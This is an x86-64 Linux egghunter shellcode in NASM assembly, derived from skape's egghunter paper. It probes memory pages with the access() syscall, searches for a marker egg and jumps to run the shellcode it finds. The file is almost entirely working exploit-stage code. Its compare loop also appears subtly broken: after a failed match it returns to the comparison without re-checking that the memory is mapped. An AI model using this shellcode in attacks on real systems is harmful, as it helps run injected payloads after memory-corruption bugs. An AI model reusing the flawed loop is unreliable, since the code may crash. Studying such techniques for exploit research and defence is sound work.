global _start

%define EGG         0x5090508f
%define ACCESS      21

; derived from skape's paper on egghunters
; mix of his access and sigaction examples
; http://hick.org/code/skape/papers/egghunt-shellcode.pdf

; int access(const char *pathname, int mode);
;; rax -> 21
;; rdi -> pointer to memory
;; rsi -> mode (0x0)
;; ---------- man access ----------
;; The mode specifies the accessibility check(s) to be performed, and is
;; either the  value  F_OK,  or  a  mask consisting of the bitwise OR of one
;; or more of R_OK, W_OK, and X_OK.
;; ---------- import os ----------
;; >>> os.F_OK
;; 0

section .text
_start:
  xor edi, edi              ; rdi     -> 0x0
  mul edi                   ; rax|rdx -> 0x0
  xchg eax, esi             ; rsi     -> 0x0

  inc edx
  shl edx, 12               ; rdx     -> 0x1000

  ; known register state before the hunt begins
  ; rsi -> 0x0
  ; rdi -> 0x0
  ; rdx -> 0x1000 -> 4096 -> PAGE_SIZE

increment_page:
  lea rdi, [rdi + rdx]              ; inc pointer by 4096 - keeping page aligned

increment_address:
  push ACCESS
  pop rax
  syscall                   ; call access($rdi, $rsi) where rsi is 0x0

  cmp al, 0xf2              ; if al contains 0xf2, EFAULT was returned (bad addr)
  je increment_page         ; continue the hunt!

compare:
  mov eax, EGG              ; store the egg for comparison
  inc al
  scasd                     ; compare and jump as appropriate
  jne compare
  scasd
  jne compare
  jmp rdi                   ; found it, execute the shellcode
